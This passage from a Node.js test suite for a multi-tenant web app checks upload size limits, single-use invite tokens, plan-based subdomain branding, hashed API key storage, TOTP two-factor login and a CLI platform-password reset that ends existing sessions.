    const big = http.request({ host: '127.0.0.1', port, method: 'POST', path: '/api/files?kind=other', headers: { Cookie: admin.cookie, 'X-Ladeklar': '1', 'Content-Type': 'image/jpeg', 'Content-Length': String(20e6) } });
    big.on('error', () => {});
    big.flushHeaders();
    const br = await new Promise((r) => big.on('response', r));
    assert.equal(br.statusCode, 413);
    big.destroy();
  } finally { await stop(); }
});

test('invite links /i/<token>, subdomain branding by plan, 2FA code at login, digest + token options', async () => {
  const { s, port, client, lic, company, stop } = await boot();
  try {
    const { tenant, admin } = await company('KAYA', 'premium');
    const r = await admin.call('createUser', { role: 'driver', name: 'Mehmet Yılmaz', phone: '0176 1234567', lang: 'tr' });
    const tok = r.data.invite.token;
    assert.match(tok, /^[\w-]{24}$/, '24 chars base64url from crypto');
    const info = await client().req('GET', '/api/public/invite/' + tok);
    assert.equal(info.status, 200);
    assert.equal(info.data.name, 'Mehmet');
    assert.equal(info.data.tenant.code, 'KAYA');
    const page = await getHost(port, '/i/' + tok, 'app.ladeklar.de');
    assert.match(page, /<meta name="lk-tenant" content="KAYA">/, 'the invite page shows the company branding');
    assert.match(await getHost(port, '/i/' + r.data.user.id, 'app.ladeklar.de'), /<meta name="lk-tenant" content="">/, 'old /i/<userId> links no longer resolve');
    const c = client();
    assert.equal((await c.req('POST', '/api/auth/invite', { token: tok, pin: r.data.pin })).status, 200);
    assert.equal((await c.req('GET', '/api/session')).data.user.role, 'driver');
    assert.equal((await client().req('POST', '/api/auth/invite', { token: tok, pin: r.data.pin })).status, 401, 'single use');
    assert.equal((await client().req('GET', '/api/public/invite/' + tok)).status, 404);

    // C15: <code>.ladeklar.de only for plans with a subdomain
    await company('NORD', 'start');
    await company('ALPEN', 'flotte');
    assert.match(await getHost(port, '/', 'nord.ladeklar.de'), /<meta name="lk-tenant" content="">/);
    assert.match(await getHost(port, '/', 'alpen.ladeklar.de'), /<meta name="lk-tenant" content="ALPEN">/);
    assert.match(await getHost(port, '/', 'kaya.ladeklar.de'), /<meta name="lk-tenant" content="KAYA">/);

    // C12 digest: the server stores sha256 hex of the key
    const key = (await admin.call('rotateApiKey')).data.apiKey;
    assert.equal(s.sql.store.get('tenants', tenant.id).apiKeyHash, crypto.createHash('sha256').update(key).digest('hex'));

    // C13: the code goes through the login
    const setup = await lic.call('twoFactorSetup');
    assert.equal(setup.status, 200);
    assert.equal((await lic.call('twoFactorEnable', { code: totp(setup.data.secret, Date.now()) })).status, 200);
    const l1 = await client().login('chef@ladeklar.de', 'plattform-pass-1');
    assert.equal(l1.status, 401);
    assert.equal(l1.data.error.code, 'need_2fa');
    assert.equal((await client().login('chef@ladeklar.de', 'plattform-pass-1', totp(setup.data.secret, Date.now() + 30e3))).status, 200);
  } finally { await stop(); }
});

test('CLI reset-platform-password: new password, 2FA off, every licensor session ends (C17)', async () => {
  const { dir, client, lic, stop } = await boot();
  try {
    assert.equal((await lic.req('GET', '/api/session')).status, 200);
    const env = { ...process.env, DATA_DIR: dir, PLATFORM_EMAIL: '', PLATFORM_PASSWORD: '' };
    const bad = spawnSync(process.execPath, ['--disable-warning=ExperimentalWarning', path.join(ROOT, 'server/index.js'), 'reset-platform-password', 'niemand@ladeklar.de', 'neues-passwort-1'], { env, encoding: 'utf8' });
    assert.equal(bad.status, 1);
    const r = spawnSync(process.execPath, ['--disable-warning=ExperimentalWarning', path.join(ROOT, 'server/index.js'), 'reset-platform-password', 'chef@ladeklar.de', 'neues-passwort-1'], { env, encoding: 'utf8' });
    assert.equal(r.status, 0, r.stderr);
    assert.equal((await lic.req('GET', '/api/session')).status, 401, 'old session ended');
    assert.equal((await client().login('chef@ladeklar.de', 'plattform-pass-1')).status, 401);
    assert.equal((await client().login('chef@ladeklar.de', 'neues-passwort-1')).status, 200);
  } finally { await stop(); }
});
